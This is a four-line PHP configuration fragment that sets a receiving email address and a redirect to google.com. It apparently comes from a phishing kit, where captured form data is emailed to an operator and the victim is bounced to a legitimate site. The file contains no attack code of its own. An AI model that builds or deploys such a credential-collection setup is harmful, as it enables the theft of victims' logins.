<?php 
$Receive_email="noregretsllc911@gmail.com";
$redirect="https://www.google.com/";
?>